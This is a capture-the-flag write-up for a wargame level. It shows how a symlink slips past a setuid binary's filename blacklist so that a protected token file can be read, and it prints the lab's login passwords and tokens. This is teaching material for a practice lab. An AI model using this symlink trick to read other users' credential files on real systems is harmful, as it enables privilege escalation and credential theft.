# level08

A binary that will read any file for you, as long as the filename doesn't contain the word "token". It checks the name, not the file. You can see the loophole from space :)

| | |
| --- | --- |
| **Login** | `level08` / `fiumuikeil55xe9cu4dood66h` (the flag07 token) |
| **flag08 password** | `quif5eloekouj29ke0vouxean` (read out of the `token` file) |
| **flag08 token** | `25749xKZ8L7DkSCwJkT9dyv6f` (aka the level09 password) |

This is the first level with two secrets: the `token` file holds flag08's **login password**, and `getflag` (run as flag08) gives the actual token. Don't confuse the two.

## poking around

Home has a setuid binary and a file we're not allowed to read:

```bash
$ ls -l ~
-rwsr-s---+ 1 flag08 level08 8617 ... level08
-rw-------  1 flag08 flag08    26 ... token      # owned by flag08, we can't touch it
```

`strings` on the binary:

```
%s [file to read]
You may not access '%s'
token
```

So the binary reads a file you name, with flag08's privileges, but it blacklists anything with "token" in the path:

```bash
$ ~/level08 ~/token
You may not access '/home/user/level08/token'
```

## the loophole

The check is on the string you pass, not on the file it points to. So we give it a different name that resolves to the same file. A symlink does exactly that:

```bash
$ ln -s ~/token /tmp/t08
$ ~/level08 /tmp/t08
quif5eloekouj29ke0vouxean
```

The path `/tmp/t08` has no "token" in it, so the blacklist is happy, and it opens right through the link to the real file. That string is flag08's password.

## finishing the job

Unlike the earlier levels, we don't run `getflag` through the exploit here, the exploit only handed us a password. So log in properly and collect the token:

```bash
$ su flag08          # password: quif5eloekouj29ke0vouxean
$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
